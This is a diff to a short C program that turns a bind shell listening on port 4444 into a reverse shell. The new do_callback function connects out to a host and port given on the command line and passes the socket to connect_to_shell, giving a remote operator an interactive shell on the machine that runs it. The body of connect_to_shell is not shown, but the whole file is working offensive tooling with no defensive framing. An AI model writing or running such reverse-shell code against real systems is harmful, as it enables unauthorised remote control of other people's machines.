@@ -2,6 +2,7 @@
 #include <sys/socket.h>
 #include <sys/wait.h>
 #include <netinet/in.h>
+#include <netdb.h>
 #include <unistd.h>
 #include <stdlib.h>
 #include <stdio.h>
@@ -10,52 +11,60 @@
 #define die(msg) \
 	do { perror(msg); exit(1); } while (0)
 
-int create_listener(int port);
+int do_callback(const char *host, const char *port);
 void connect_to_shell(int connfd);
 
-int main(void)
+int main(int argc, char *argv[])
 {
 	int sockfd;
-	int connfd;
 
-	sockfd = create_listener(4444);
-	connfd = accept(sockfd, NULL, NULL); 
-	if (-1 == connfd) {
-		die("accept");
+	if (argc != 3) {
+		fprintf(stderr, "USAGE: %s host port\n", argv[0]);
+		exit(1);
 	}
 
-	connect_to_shell(connfd);
+	sockfd = do_callback(argv[1], argv[2]);
+	connect_to_shell(sockfd);
 
 	return 0;
 }
 
-int create_listener(int port)
+int do_callback(const char *host, const char *port)
 {
+	struct addrinfo hints;
+	struct addrinfo *result, *rp;
 	int sockfd;
-	struct sockaddr_in saddr;
+	int s;
 
-	memset(&saddr, 0, sizeof(struct sockaddr));
-	saddr.sin_family = AF_INET;
-	saddr.sin_port = htons(port);
+	memset(&hints, 0, sizeof(struct addrinfo));
+	hints.ai_family = AF_UNSPEC;
+	hints.ai_socktype = SOCK_STREAM;
 
-	sockfd = socket(AF_INET, SOCK_STREAM, 0);
-	if (-1 == sockfd) {
-		die("socket");
+	s = getaddrinfo(host, port, &hints, &result);
+	if (0 != s) {
+		fprintf(stderr, "getaddrinfo: %s\n", gai_strerror(s));
+		exit(1);
 	}
 
-	int enable = 1;
-	if (-1 == setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &enable, 
-				sizeof(int))) {
-		die("setsockopt(SO_REUSE_ADDR)");
+	for (rp = result; rp != NULL; rp = rp->ai_next) {
+		sockfd = socket(rp->ai_family, rp->ai_socktype, 
+				rp->ai_protocol);
+		if (-1 == sockfd) {
+			continue;
+		}
+
+		if (-1 != connect(sockfd, rp->ai_addr, rp->ai_addrlen)) {
+			break;
+		}
+
+		close(sockfd);
 	}
 
-	if (-1 == bind(sockfd, (struct sockaddr *)&saddr, sizeof(saddr))) {
-		die("bind");
+	if (NULL == rp) {
+		die("Failed to connect");
 	}
 
-	if (-1 == listen(sockfd, 32)) {
-		die("listen");
-	}
+	freeaddrinfo(result);
 
 	return sockfd;
 }
